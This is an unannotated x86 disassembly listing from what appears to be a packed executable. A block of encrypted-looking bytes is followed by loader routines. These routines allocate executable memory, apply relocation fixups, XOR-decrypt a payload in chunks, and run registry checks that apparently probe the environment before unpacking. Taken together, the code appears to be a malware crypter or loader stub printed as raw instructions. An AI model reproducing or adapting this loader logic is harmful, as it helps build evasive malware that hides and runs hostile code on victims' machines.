  450e63:	daa    
  450e64:	inc    ebp
  450e65:	add    ah,dh
  450e67:	daa    
  450e68:	inc    ebp
  450e69:	add    al,bh
  450e6b:	daa    
  450e6c:	inc    ebp
  450e6d:	add    ah,bh
  450e6f:	daa    
  450e70:	inc    ebp
  450e71:	add    BYTE PTR [eax],al
  450e73:	sub    BYTE PTR [ebp+0x0],al
  450e76:	test   BYTE PTR [edi],ah
  450e78:	inc    ebp
  450e79:	add    BYTE PTR [eax+ebp*1],al
  450e7c:	inc    ebp
  450e7d:	add    BYTE PTR [edi+eiz*1+0x45],dl
  450e81:	add    BYTE PTR [eax],cl
  450e83:	sub    BYTE PTR [ebp+0x0],al
  450e86:	pop    esp
  450e87:	and    eax,0x26300045
  450e8c:	inc    ebp
  450e8d:	add    BYTE PTR [eax+ebp*1],cl
  450e90:	inc    ebp
  450e91:	add    BYTE PTR [eax],dl
  450e93:	sub    BYTE PTR [ebp+0x0],al
  450e96:	adc    al,0x28
  450e98:	inc    ebp
  450e99:	add    BYTE PTR [eax],bl
  450e9b:	sub    BYTE PTR [ebp+0x0],al
  450e9e:	sbb    al,0x28
  450ea0:	inc    ebp
  450ea1:	add    BYTE PTR [eax],ah
  450ea3:	sub    BYTE PTR [ebp+0x0],al
  450ea6:	and    al,0x28
  450ea8:	inc    ebp
  450ea9:	add    BYTE PTR [eax],ch
  450eab:	sub    BYTE PTR [ebp+0x0],al
  450eae:	sub    al,0x28
  450eb0:	inc    ebp
  450eb1:	add    BYTE PTR [eax],dh
  450eb3:	sub    BYTE PTR [ebp+0x0],al
  450eb6:	xor    al,0x28
  450eb8:	inc    ebp
  450eb9:	add    BYTE PTR [eax],bh
  450ebb:	sub    BYTE PTR [ebp+0x0],al
  450ebe:	cmp    al,0x28
  450ec0:	inc    ebp
  450ec1:	add    BYTE PTR [eax+0x28],al
  450ec4:	inc    ebp
  450ec5:	add    ah,bh
  450ec7:	and    al,0x45
  450ec9:	add    BYTE PTR [eax+ebp*1+0x45],al
  450ecd:	add    BYTE PTR [eax+0x28],cl
  450ed0:	inc    ebp
  450ed1:	add    BYTE PTR [eax+ebp*1+0x45],cl
  450ed5:	add    BYTE PTR [eax+0x26],cl
  450ed8:	inc    ebp
  450ed9:	add    BYTE PTR [eax+0x28],dl
  450edc:	inc    ebp
  450edd:	add    BYTE PTR [eax+ebp*1+0x45],dl
  450ee1:	add    BYTE PTR [eax],dl
  450ee3:	and    eax,0x28580045
  450ee8:	inc    ebp
  450ee9:	add    al,ch
  450eeb:	and    eax,0x285c0045
  450ef0:	inc    ebp
  450ef1:	add    BYTE PTR [eax+0x28],ah
  450ef4:	inc    ebp
  450ef5:	add    BYTE PTR [eax+ebp*1+0x45],ah
  450ef9:	add    BYTE PTR [eax+0x28],ch
  450efc:	inc    ebp
  450efd:	add    BYTE PTR [eax+ebp*1+0x45],ch
  450f01:	add    BYTE PTR [eax+0x28],dh
  450f04:	inc    ebp
  450f05:	add    BYTE PTR [eax],ch
  450f07:	and    eax,0x28740045
  450f0c:	inc    ebp
  450f0d:	add    BYTE PTR [edi+eiz*1+0x45],ah
  450f11:	add    BYTE PTR [eax+0x28],bh
  450f14:	inc    ebp
  450f15:	add    BYTE PTR [eax+ebp*1+0x45],bh
  450f19:	add    BYTE PTR [eax-0x7bffbad8],al
  450f1f:	sub    BYTE PTR [ebp+0x0],al
  450f22:	fsub   DWORD PTR [esi]
  450f24:	inc    ebp
  450f25:	add    BYTE PTR [eax-0x73ffbad8],cl
  450f2b:	sub    BYTE PTR [ebp+0x0],al
  450f2e:	or     al,0x26
  450f30:	inc    ebp
  450f31:	add    BYTE PTR [eax+ebp*1+0x45],bl
  450f35:	add    BYTE PTR [eax-0x6bffbad8],dl
  450f3b:	sub    BYTE PTR [ebp+0x0],al
  450f3e:	push   ds
  450f3f:	das    
  450f40:	xor    al,0x38
  450f42:	push   es
  450f43:	aad    0xa4
  450f45:	pop    ecx
  450f46:	push   eax
  450f47:	rcr    BYTE PTR [edi],1
  450f49:	mov    ah,0x3a
  450f4b:	mov    al,0x64
  450f4d:	pop    edi
  450f4e:	jne    0x450f4e
  450f50:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  450f52:	cmp    BYTE PTR [ebx],ah
  450f54:	repz dec eax
  450f56:	xchg   ebx,eax
  450f57:	add    DWORD PTR [ebx-0x72],0x29
  450f5b:	fisubr WORD PTR cs:0xa6596c6e
  450f62:	sub    cl,BYTE PTR [esi]
  450f64:	jle    0x450f83
  450f66:	ss (bad) 
  450f68:	push   0xd28e2fc3
  450f6d:	je     0x450fbc
  450f6f:	adc    al,0x27
  450f71:	loop   0x450f58
  450f73:	scas   al,BYTE PTR es:[edi]
  450f74:	add    al,0x17
  450f76:	popf   
  450f77:	mov    edx,0x6230670e
  450f7c:	daa    
  450f7d:	jno    0x450ffb
  450f7f:	fsubr  QWORD PTR [ecx]
  450f81:	adc    ecx,DWORD PTR [esi+0x1da8e962]
  450f87:	xor    al,0x41
  450f89:	or     dl,BYTE PTR [ebx]
  450f8b:	sub    edx,0x41ddc2a6
  450f91:	pop    ds
  450f92:	sti    
  450f93:	les    ecx,FWORD PTR [ecx-0x3d]
  450f96:	and    bl,0x68
  450f99:	cmp    ch,dh
  450f9b:	and    DWORD PTR [esi+edx*2],edx
  450f9e:	pop    ds
  450f9f:	inc    eax
  450fa0:	and    al,0x20
  450fa2:	and    ebx,eax
  450fa4:	inc    edi
  450fa5:	imul   edi,edx,0x373b1786
  450fab:	loope  0x450fba
  450fad:	mov    WORD PTR [esp+edx*4],gs
  450fb0:	add    ch,BYTE PTR [ebp+0x72]
  450fb3:	jbe    0x450fee
  450fb5:	mov    cl,0x78
  450fb7:	arpl   WORD PTR [ebp-0x76d74642],cx
  450fbd:	sbb    DWORD PTR [ecx+eax*4],0x5fb5f441
  450fc4:	xchg   dl,dh
  450fc6:	jnp    0x450fcf
  450fc8:	mov    al,0xd
  450fca:	ins    DWORD PTR es:[edi],dx
  450fcb:	in     al,0xa6
  450fcd:	mov    eax,0xc0f469b7
  450fd2:	adc    BYTE PTR [esi+eiz*4-0x53],dl
  450fd6:	mov    ebx,esi
  450fd8:	or     esp,DWORD PTR [ebx]
  450fda:	imul   DWORD PTR [edx+0x7f606301]
  450fe0:	jae    0x45102f
  450fe2:	xchg   al,bl
  450fe4:	sub    eax,0xcea02444
  450fe9:	test   eax,0x6ceb2343
  450fee:	xchg   edx,eax
  450fef:	in     al,dx
  450ff0:	adc    eax,0x6530a6fc
  450ff6:	ret    0xc841
  450ff9:	xchg   edx,esp
  450ffb:	and    esp,DWORD PTR [esi+0x751aaee3]
  451001:	pop    esp
  451002:	(bad)  
  451003:	push   es
  451004:	cmp    BYTE PTR [ecx],ch
  451006:	jg     0x451084
  451008:	lods   eax,DWORD PTR ds:[esi]
  451009:	jecxz  0x450fcb
  45100b:	inc    esi
  45100c:	jmp    0x682b:0xe4b1827c
  451013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  451014:	retf   0x9f1d
  451017:	lahf   
  451018:	popa   
  451019:	lea    eax,[ebx+ebp*2-0x4acc869c]
  451020:	mov    ds:0xf34702f2,eax
  451025:	pop    esi
  451026:	inc    ecx
  451027:	mov    dh,0xb4
  451029:	xchg   edi,eax
  45102a:	fild   QWORD PTR [ebx+0x15]
  45102d:	mov    cl,0x12
  45102f:	pop    edi
  451030:	xor    ah,BYTE PTR [edx]
  451032:	or     dl,BYTE PTR [esi+ecx*8-0x30]
  451036:	inc    edx
  451037:	imul   BYTE PTR [ebp+0x4b]
  45103a:	sbb    BYTE PTR [ebx-0xd],ch
  45103d:	cwde   
  45103e:	ins    DWORD PTR es:[edi],dx
  45103f:	mov    al,0x4b
  451041:	add    ah,BYTE PTR [eax]
  451043:	inc    esi
  451044:	mov    bl,0xbd
  451046:	(bad)  
  451047:	mov    ecx,0xc99deeb2
  45104c:	cdq    
  45104d:	ficomp DWORD PTR [edi]
  45104f:	daa    
  451050:	mov    cl,0x31
  451052:	fucom  st(0)
  451054:	xor    al,0xae
  451056:	mov    ah,BYTE PTR [edx-0x564d5751]
  45105c:	inc    esp
  45105d:	xor    ch,BYTE PTR [edx+0x79]
  451060:	js     0x45101e
  451062:	ss ds (bad) 
  451066:	sbb    al,0x79
  451068:	loop   0x4510d6
  45106a:	repz mov ebx,0xe067866e
  451070:	mov    esi,ebp
  451072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451073:	popa   
  451074:	pusha  
  451075:	cmp    bl,dl
  451077:	mov    ds:0x8149cd19,al
  45107c:	sbb    eax,0x155683b
  451081:	and    al,0xa
  451083:	into   
  451084:	jno    0x45105b
  451086:	adc    eax,0x823b4f6a
  45108b:	and    edi,DWORD PTR ds:0xd372eab6
  451091:	das    
  451092:	fidivr DWORD PTR [ebx+0x290ba3e]
  451098:	neg    DWORD PTR [eax-0xe900605]
  45109e:	into   
  45109f:	stos   DWORD PTR es:[edi],eax
  4510a0:	scas   eax,DWORD PTR es:[edi]
  4510a1:	int    0x84
  4510a3:	mov    ebx,0xeb855f8e
  4510a8:	xor    bl,bh
  4510aa:	ja     0x451070
  4510ac:	jmp    0x2e6e:0x636a615c
  4510b3:	iret   
  4510b4:	mov    ?,esp
  4510b6:	addr16 nop
  4510b8:	push   ss
  4510b9:	fwait
  4510ba:	pop    edi
  4510bb:	mov    eax,0x71f33fce
  4510c0:	out    dx,al
  4510c1:	(bad)  
  4510c2:	test   DWORD PTR [esi+ebx*4+0x6318cc31],0xb4e19483
  4510cd:	pop    eax
  4510ce:	iret   
  4510cf:	or     esi,DWORD PTR ds:0xfa58f948
  4510d5:	imul   edx,esi,0x76
  4510d8:	cmp    al,0x22
  4510da:	jb     0x45113b
  4510dc:	in     eax,0x32
  4510de:	inc    ebx
  4510df:	fnstcw WORD PTR [edi]
  4510e1:	inc    ecx
  4510e2:	fdiv   QWORD PTR [esi-0x9]
  4510e5:	mov    WORD PTR [eax-0x9471ca0],?
  4510eb:	xchg   edi,eax
  4510ec:	fiadd  WORD PTR [eax-0x3256b94]
  4510f2:	mov    cl,0xf1
  4510f4:	loope  0x451113
  4510f6:	lods   eax,DWORD PTR ds:[esi]
  4510f7:	xchg   ebx,eax
  4510f8:	gs into 
  4510fa:	cmp    eax,0x3a47d382
  4510ff:	jne    0x4510b4
  451101:	pop    eax
  451102:	mov    WORD PTR [ecx],?
  451104:	test   eax,0xe3cb06b7
  451109:	jae    0x451176
  45110b:	jle    0x45111a
  45110d:	push   esp
  45110e:	out    0x29,eax
  451110:	and    DWORD PTR [edi+0x34],edx
  451113:	add    dh,bl
  451115:	fdivr  DWORD PTR [eax-0x5f0e3386]
  45111b:	and    ebp,DWORD PTR [ebx+ebp*8+0x53239075]
  451122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  451123:	cdq    
  451124:	add    al,0x3a
  451126:	or     ah,BYTE PTR [edx]
  451128:	aam    0x2d
  45112a:	pop    es
  45112b:	or     BYTE PTR [eax-0x3bd2ae44],dl
  451131:	sbb    esi,esp
  451133:	in     al,0xa0
  451135:	out    dx,al
  451136:	rol    edi,cl
  451138:	xchg   ecx,eax
  451139:	pop    edx
  45113a:	mov    ds:0xcc34d52d,eax
  45113f:	int3   
  451140:	push   ebp
  451141:	mov    ebp,esp
  451143:	sub    esp,0xc
  451146:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  45114d:	mov    DWORD PTR [ebp-0xc],0x3000
  451154:	mov    DWORD PTR [ebp-0x4],0x40
  45115b:	mov    eax,DWORD PTR [ebp-0x4]
  45115e:	push   eax
  45115f:	mov    ecx,DWORD PTR [ebp-0xc]
  451162:	push   ecx
  451163:	mov    edx,DWORD PTR [ebp+0x8]
  451166:	push   edx
  451167:	push   0x0
  451169:	push   0xffffffff
  45116b:	call   DWORD PTR ds:0x4524e4
  451171:	mov    esp,ebp
  451173:	pop    ebp
  451174:	ret    
  451175:	int3   
  451176:	int3   
  451177:	int3   
  451178:	int3   
  451179:	int3   
  45117a:	int3   
  45117b:	int3   
  45117c:	int3   
  45117d:	int3   
  45117e:	int3   
  45117f:	int3   
  451180:	push   ebp
  451181:	mov    ebp,esp
  451183:	pop    ebp
  451184:	ret    
  451185:	int3   
  451186:	int3   
  451187:	int3   
  451188:	int3   
  451189:	int3   
  45118a:	int3   
  45118b:	int3   
  45118c:	int3   
  45118d:	int3   
  45118e:	int3   
  45118f:	int3   
  451190:	push   ebp
  451191:	mov    ebp,esp
  451193:	sub    esp,0x8
  451196:	mov    eax,DWORD PTR [ebp+0x8]
  451199:	mov    DWORD PTR [ebp-0x4],eax
  45119c:	mov    ecx,DWORD PTR [ebp+0xc]
  45119f:	mov    DWORD PTR [ebp-0x8],ecx
  4511a2:	mov    edx,DWORD PTR [ebp-0x4]
  4511a5:	cmp    edx,DWORD PTR [ebp-0x8]
  4511a8:	jae    0x4511b1
  4511aa:	mov    eax,DWORD PTR [ebp-0x4]
  4511ad:	jmp    0x4511b4
  4511af:	jmp    0x4511b4
  4511b1:	mov    eax,DWORD PTR [ebp-0x8]
  4511b4:	mov    esp,ebp
  4511b6:	pop    ebp
  4511b7:	ret    
  4511b8:	int3   
  4511b9:	int3   
  4511ba:	int3   
  4511bb:	int3   
  4511bc:	int3   
  4511bd:	int3   
  4511be:	int3   
  4511bf:	int3   
  4511c0:	push   ebp
  4511c1:	mov    ebp,esp
  4511c3:	mov    DWORD PTR ds:0x453a24,0x401004
  4511cd:	pop    ebp
  4511ce:	ret    
  4511cf:	int3   
  4511d0:	push   ebp
  4511d1:	mov    ebp,esp
  4511d3:	mov    DWORD PTR ds:0x453a24,0x4505f0
  4511dd:	pop    ebp
  4511de:	ret    
  4511df:	int3   
  4511e0:	push   ebp
  4511e1:	mov    ebp,esp
  4511e3:	mov    eax,DWORD PTR [ebp+0x8]
  4511e6:	mov    eax,DWORD PTR [eax-0x4]
  4511e9:	pop    ebp
  4511ea:	ret    
  4511eb:	int3   
  4511ec:	int3   
  4511ed:	int3   
  4511ee:	int3   
  4511ef:	int3   
  4511f0:	push   ebp
  4511f1:	mov    ebp,esp
  4511f3:	sub    esp,0xc
  4511f6:	mov    DWORD PTR [ebp-0x4],0x0
  4511fd:	jmp    0x451208
  4511ff:	mov    eax,DWORD PTR [ebp-0x4]
  451202:	add    eax,0x1
  451205:	mov    DWORD PTR [ebp-0x4],eax
  451208:	mov    ecx,DWORD PTR [ebp-0x4]
  45120b:	cmp    ecx,DWORD PTR [ebp+0x8]
  45120e:	jae    0x45125f
  451210:	mov    edx,DWORD PTR [ebp-0x4]
  451213:	mov    eax,DWORD PTR [ebp+0xc]
  451216:	movzx  ecx,WORD PTR [eax+edx*2]
  45121a:	sar    ecx,0xc
  45121d:	cmp    ecx,0x3
  451220:	jne    0x45125d
  451222:	mov    DWORD PTR [ebp-0xc],0xfff
  451229:	mov    edx,DWORD PTR [ebp-0x4]
  45122c:	mov    eax,DWORD PTR [ebp+0xc]
  45122f:	movzx  ecx,WORD PTR [eax+edx*2]
  451233:	and    ecx,DWORD PTR [ebp-0xc]
  451236:	add    ecx,0x43
  451239:	mov    DWORD PTR [ebp-0x8],ecx
  45123c:	mov    edx,DWORD PTR [ebp+0x18]
  45123f:	mov    eax,DWORD PTR [ebp+0x10]
  451242:	add    eax,DWORD PTR [edx]
  451244:	mov    ecx,DWORD PTR [ebp-0x8]
  451247:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  45124b:	add    edx,DWORD PTR [ebp+0x14]
  45124e:	mov    eax,DWORD PTR [ebp+0x18]
  451251:	mov    ecx,DWORD PTR [ebp+0x10]
  451254:	add    ecx,DWORD PTR [eax]
  451256:	mov    eax,DWORD PTR [ebp-0x8]
  451259:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  45125d:	jmp    0x4511ff
  45125f:	mov    esp,ebp
  451261:	pop    ebp
  451262:	ret    
  451263:	int3   
  451264:	int3   
  451265:	int3   
  451266:	int3   
  451267:	int3   
  451268:	int3   
  451269:	int3   
  45126a:	int3   
  45126b:	int3   
  45126c:	int3   
  45126d:	int3   
  45126e:	int3   
  45126f:	int3   
  451270:	push   ebp
  451271:	mov    ebp,esp
  451273:	sub    esp,0x28
  451276:	mov    DWORD PTR [ebp-0x8],0x11cb
  45127d:	mov    DWORD PTR [ebp-0x10],0x0
  451284:	jmp    0x45128f
  451286:	mov    eax,DWORD PTR [ebp-0x10]
  451289:	add    eax,0x4
  45128c:	mov    DWORD PTR [ebp-0x10],eax
  45128f:	mov    ecx,DWORD PTR [ebp-0x10]
  451292:	cmp    ecx,DWORD PTR [ebp+0xc]
  451295:	jae    0x451367
  45129b:	mov    DWORD PTR [ebp-0x8],0x11cb
  4512a2:	cmp    DWORD PTR [ebp-0x10],0x0
  4512a6:	jne    0x4512f8
  4512a8:	push   0x104
  4512ad:	push   0x453a28
  4512b2:	call   DWORD PTR ds:0x4524e8
  4512b8:	push   0x452000
  4512bd:	push   0x453a28
  4512c2:	call   DWORD PTR ds:0x4524ec
  4512c8:	push   0x0
  4512ca:	push   0x80
  4512cf:	push   0x3
  4512d1:	push   0x0
  4512d3:	push   0x3
  4512d5:	push   0x1
  4512d7:	push   0x453a28
  4512dc:	call   DWORD PTR ds:0x4524f0
  4512e2:	mov    DWORD PTR [ebp-0x4],eax
  4512e5:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  4512e9:	je     0x4512f1
  4512eb:	cmp    DWORD PTR [ebp-0x4],0x0
  4512ef:	jne    0x4512f8
  4512f1:	mov    eax,0x42
  4512f6:	jmp    0x451367
  4512f8:	mov    DWORD PTR [ebp-0x8],0x11cb
  4512ff:	mov    edx,DWORD PTR [ebp-0x10]
  451302:	add    edx,0x4f4
  451308:	mov    DWORD PTR ds:0x453b2c,edx
  45130e:	mov    eax,DWORD PTR [ebp+0x8]
  451311:	add    eax,DWORD PTR [ebp-0x10]
  451314:	mov    ecx,DWORD PTR [eax]
  451316:	add    ecx,DWORD PTR [ebp-0x10]
  451319:	mov    edx,DWORD PTR [ebp+0x8]
  45131c:	add    edx,DWORD PTR [ebp-0x10]
  45131f:	mov    DWORD PTR [edx],ecx
  451321:	mov    eax,DWORD PTR [ebp-0xc]
  451324:	mov    DWORD PTR [ebp-0x14],eax
  451327:	mov    DWORD PTR [ebp-0x8],0x11cb
  45132e:	mov    ecx,DWORD PTR ds:0x453b2c
  451334:	mov    DWORD PTR [ebp-0x24],ecx
  451337:	mov    edx,DWORD PTR [ebp-0x24]
  45133a:	mov    DWORD PTR [ebp-0x20],edx
  45133d:	mov    eax,DWORD PTR [ebp-0x20]
  451340:	mov    DWORD PTR [ebp-0x1c],eax
  451343:	mov    ecx,DWORD PTR [ebp-0x1c]
  451346:	mov    DWORD PTR [ebp-0x18],ecx
  451349:	mov    edx,DWORD PTR [ebp-0x18]
  45134c:	mov    DWORD PTR [ebp-0x28],edx
  45134f:	mov    eax,DWORD PTR [ebp+0x8]
  451352:	add    eax,DWORD PTR [ebp-0x10]
  451355:	mov    ecx,DWORD PTR [eax]
  451357:	xor    ecx,DWORD PTR [ebp-0x18]
  45135a:	mov    edx,DWORD PTR [ebp+0x8]
  45135d:	add    edx,DWORD PTR [ebp-0x10]
  451360:	mov    DWORD PTR [edx],ecx
  451362:	jmp    0x451286
  451367:	mov    esp,ebp
  451369:	pop    ebp
  45136a:	ret    
  45136b:	int3   
  45136c:	int3   
  45136d:	int3   
  45136e:	int3   
  45136f:	int3   
  451370:	push   ebp
  451371:	mov    ebp,esp
  451373:	sub    esp,0x14
  451376:	mov    eax,DWORD PTR [ebp+0x8]
  451379:	cmp    DWORD PTR [eax+0x4],0x0
  45137d:	je     0x4513c7
  45137f:	mov    DWORD PTR [ebp-0x14],0x2a1
  451386:	mov    ecx,DWORD PTR [ebp+0x8]
  451389:	mov    edx,DWORD PTR [ecx+0x4]
  45138c:	sub    edx,0x8
  45138f:	shr    edx,1
  451391:	mov    DWORD PTR [ebp-0xc],edx
  451394:	mov    eax,DWORD PTR [ebp+0x8]
  451397:	add    eax,0x8
  45139a:	mov    DWORD PTR [ebp-0x10],eax
  45139d:	mov    ecx,DWORD PTR [ebp+0x8]
  4513a0:	push   ecx
  4513a1:	mov    edx,DWORD PTR [ebp+0x10]
  4513a4:	push   edx
  4513a5:	mov    eax,DWORD PTR [ebp+0xc]
  4513a8:	push   eax
  4513a9:	mov    ecx,DWORD PTR [ebp-0x10]
  4513ac:	push   ecx
  4513ad:	mov    edx,DWORD PTR [ebp-0xc]
  4513b0:	push   edx
  4513b1:	call   0x4511f0
  4513b6:	add    esp,0x14
  4513b9:	mov    eax,DWORD PTR [ebp+0x8]
  4513bc:	mov    ecx,DWORD PTR [ebp+0x8]
  4513bf:	add    ecx,DWORD PTR [eax+0x4]
  4513c2:	mov    DWORD PTR [ebp+0x8],ecx
  4513c5:	jmp    0x451376
  4513c7:	mov    esp,ebp
  4513c9:	pop    ebp
  4513ca:	ret    
  4513cb:	int3   
  4513cc:	int3   
  4513cd:	int3   
  4513ce:	int3   
  4513cf:	int3   
  4513d0:	push   ebp
  4513d1:	mov    ebp,esp
  4513d3:	sub    esp,0x8
  4513d6:	mov    DWORD PTR [ebp-0x4],0x452018
  4513dd:	lea    eax,[ebp-0x8]
  4513e0:	push   eax
  4513e1:	push   0x20019
  4513e6:	push   0x0
  4513e8:	push   0x453a1c
  4513ed:	push   0x80000002
  4513f2:	call   DWORD PTR ds:0x453b30
  4513f8:	test   eax,eax
  4513fa:	je     0x451403
  4513fc:	xor    eax,eax
  4513fe:	jmp    0x4514a4
  451403:	lea    ecx,[ebp-0x8]
  451406:	push   ecx
  451407:	push   0x20019
  45140c:	push   0x0
  45140e:	push   0x453a20
  451413:	push   0x80000002
  451418:	call   DWORD PTR ds:0x453b30
  45141e:	test   eax,eax
  451420:	je     0x451426
  451422:	xor    eax,eax
  451424:	jmp    0x4514a4
  451426:	mov    edx,0x53
  45142b:	mov    eax,DWORD PTR [ebp-0x4]
  45142e:	mov    WORD PTR [eax],dx
  451431:	lea    ecx,[ebp-0x8]
  451434:	push   ecx
  451435:	push   0x20019
  45143a:	push   0x0
  45143c:	mov    edx,DWORD PTR [ebp-0x4]
  45143f:	push   edx
  451440:	mov    eax,DWORD PTR [ebp-0x8]
  451443:	push   eax
  451444:	call   DWORD PTR ds:0x453b30
  45144a:	test   eax,eax
  45144c:	je     0x451452
  45144e:	xor    eax,eax
  451450:	jmp    0x4514a4
  451452:	lea    ecx,[ebp-0x8]
  451455:	push   ecx
  451456:	push   0x20019
  45145b:	push   0x0
  45145d:	push   0x452030
  451462:	mov    edx,DWORD PTR [ebp-0x8]
  451465:	push   edx
  451466:	call   DWORD PTR ds:0x453b30
  45146c:	test   eax,eax
  45146e:	je     0x45147d
  451470:	push   0x1
  451472:	push   0x1
  451474:	push   0x1
  451476:	push   0x1
  451478:	call   0x4513d0
  45147d:	lea    eax,[ebp-0x8]
  451480:	push   eax
  451481:	push   0x20019
  451486:	push   0x0
  451488:	push   0x4520ac
  45148d:	mov    ecx,DWORD PTR [ebp-0x8]
  451490:	push   ecx
  451491:	call   DWORD PTR ds:0x453b30
  451497:	test   eax,eax
  451499:	jne    0x45149f
  45149b:	xor    eax,eax
  45149d:	jmp    0x4514a4
  45149f:	call   0x4511c0
  4514a4:	mov    esp,ebp
  4514a6:	pop    ebp
  4514a7:	ret    0x10
  4514aa:	int3   
  4514ab:	int3   
  4514ac:	int3   
  4514ad:	int3   
  4514ae:	int3   
  4514af:	int3   
  4514b0:	push   ebp
  4514b1:	mov    ebp,esp
  4514b3:	sub    esp,0x70
  4514b6:	pusha  
  4514b7:	mov    DWORD PTR ds:0x453b34,ebp
  4514bd:	mov    DWORD PTR [ebp-0x3c],0x0
  4514c4:	mov    DWORD PTR [ebp-0x50],0x80000002
  4514cb:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  4514d2:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  4514d9:	mov    eax,ds:0x4528a4
  4514de:	mov    ds:0x453b30,eax
  4514e3:	lea    ecx,[ebp-0x54]
  4514e6:	push   ecx
  4514e7:	lea    edx,[ebp-0x58]
  4514ea:	push   edx
  4514eb:	lea    eax,[ebp-0x8]
  4514ee:	push   eax
  4514ef:	call   DWORD PTR ds:0x4524f4
  4514f5:	movzx  ecx,WORD PTR [ebp-0x58]
  4514f9:	cmp    ecx,0x21
  4514fc:	je     0x451505
  4514fe:	xor    eax,eax
  451500:	jmp    0x4516fc
  451505:	push   0x1
  451507:	push   0x1
  451509:	push   0x1
  45150b:	push   0x1
  45150d:	call   0x4513d0
  451512:	mov    DWORD PTR [ebp-0x14],0x0
  451519:	mov    DWORD PTR [ebp-0x34],0x64
  451520:	mov    DWORD PTR [ebp-0x1c],0x19
  451527:	mov    DWORD PTR [ebp-0x3c],0x0
  45152e:	mov    DWORD PTR [ebp-0x24],0x0
  451535:	mov    DWORD PTR [ebp-0x30],0x1
  45153c:	mov    DWORD PTR [ebp-0x18],0x3
  451543:	mov    edx,DWORD PTR ds:0x453a24
  451549:	push   edx
  45154a:	call   0x4511e0
  45154f:	add    esp,0x4
  451552:	mov    DWORD PTR [ebp-0x40],eax
  451555:	mov    eax,DWORD PTR [ebp-0x40]
  451558:	push   eax
  451559:	call   0x451140
  45155e:	add    esp,0x4
  451561:	mov    DWORD PTR [ebp-0x38],eax
  451564:	mov    ecx,DWORD PTR [ebp-0x40]
  451567:	push   ecx
  451568:	push   0x0
  45156a:	mov    edx,DWORD PTR [ebp-0x38]
  45156d:	push   edx
  45156e:	call   0x451180
  451573:	add    esp,0xc
  451576:	mov    eax,DWORD PTR [ebp-0x40]
  451579:	mov    DWORD PTR [ebp-0x48],eax
  45157c:	mov    ecx,DWORD PTR [ebp-0x3c]
  45157f:	cmp    ecx,DWORD PTR [ebp-0x40]
  451582:	jae    0x4515d4
  451584:	mov    edx,DWORD PTR [ebp-0x48]
  451587:	push   edx
  451588:	mov    eax,DWORD PTR [ebp-0x34]
  45158b:	push   eax
  45158c:	call   0x451190
  451591:	add    esp,0x8
  451594:	mov    DWORD PTR [ebp-0x4c],eax
  451597:	mov    ecx,DWORD PTR [ebp-0x4c]
  45159a:	push   ecx
  45159b:	mov    edx,DWORD PTR ds:0x453a24
  4515a1:	add    edx,DWORD PTR [ebp-0x24]
  4515a4:	push   edx
  4515a5:	mov    eax,DWORD PTR [ebp-0x38]
  4515a8:	add    eax,DWORD PTR [ebp-0x3c]
  4515ab:	push   eax
  4515ac:	call   0x451c98
  4515b1:	add    esp,0xc
  4515b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4515b7:	add    ecx,DWORD PTR [ebp-0x34]
  4515ba:	add    ecx,DWORD PTR [ebp-0x24]
  4515bd:	mov    DWORD PTR [ebp-0x24],ecx
  4515c0:	mov    edx,DWORD PTR [ebp-0x3c]
  4515c3:	add    edx,DWORD PTR [ebp-0x34]
  4515c6:	mov    DWORD PTR [ebp-0x3c],edx
  4515c9:	mov    eax,DWORD PTR [ebp-0x48]
  4515cc:	sub    eax,DWORD PTR [ebp-0x4c]
  4515cf:	mov    DWORD PTR [ebp-0x48],eax
  4515d2:	jmp    0x45157c
  4515d4:	mov    ecx,DWORD PTR [ebp-0x40]
  4515d7:	push   ecx
  4515d8:	mov    edx,DWORD PTR [ebp-0x38]
  4515db:	push   edx
  4515dc:	call   0x451270
  4515e1:	add    esp,0x8
  4515e4:	mov    DWORD PTR [ebp-0x24],0x0
  4515eb:	mov    DWORD PTR [ebp-0x60],0x0
  4515f2:	call   0x4511d0
  4515f7:	mov    eax,ds:0x453a24
  4515fc:	push   eax
  4515fd:	call   0x4511e0
  451602:	add    esp,0x4
  451605:	mov    DWORD PTR [ebp-0x64],eax
  451608:	mov    ecx,DWORD PTR [ebp-0x64]
  45160b:	push   ecx
  45160c:	call   0x451140
  451611:	add    esp,0x4
  451614:	mov    DWORD PTR [ebp-0x20],eax
  451617:	mov    edx,DWORD PTR [ebp-0x64]
  45161a:	push   edx
  45161b:	push   0x0
  45161d:	mov    eax,DWORD PTR [ebp-0x20]
  451620:	push   eax
  451621:	call   0x451180
  451626:	add    esp,0xc
  451629:	mov    ecx,DWORD PTR [ebp-0x64]
  45162c:	mov    DWORD PTR [ebp-0x6c],ecx
  45162f:	mov    edx,DWORD PTR [ebp-0x60]
  451632:	cmp    edx,DWORD PTR [ebp-0x64]
  451635:	jae    0x451686
  451637:	mov    eax,DWORD PTR [ebp-0x6c]
  45163a:	push   eax
  45163b:	mov    ecx,DWORD PTR [ebp-0x34]
  45163e:	push   ecx
  45163f:	call   0x451190
  451644:	add    esp,0x8
  451647:	mov    DWORD PTR [ebp-0x70],eax
  45164a:	mov    edx,DWORD PTR [ebp-0x70]
  45164d:	push   edx
  45164e:	mov    eax,ds:0x453a24
  451653:	add    eax,DWORD PTR [ebp-0x24]
  451656:	push   eax
  451657:	mov    ecx,DWORD PTR [ebp-0x20]
  45165a:	add    ecx,DWORD PTR [ebp-0x60]
  45165d:	push   ecx
  45165e:	call   0x451c98
  451663:	add    esp,0xc
  451666:	mov    edx,DWORD PTR [ebp-0x1c]
  451669:	add    edx,DWORD PTR [ebp-0x34]
  45166c:	add    edx,DWORD PTR [ebp-0x24]
  45166f:	mov    DWORD PTR [ebp-0x24],edx
  451672:	mov    eax,DWORD PTR [ebp-0x60]
  451675:	add    eax,DWORD PTR [ebp-0x34]
  451678:	mov    DWORD PTR [ebp-0x60],eax
  45167b:	mov    ecx,DWORD PTR [ebp-0x6c]
  45167e:	sub    ecx,DWORD PTR [ebp-0x70]
  451681:	mov    DWORD PTR [ebp-0x6c],ecx
  451684:	jmp    0x45162f
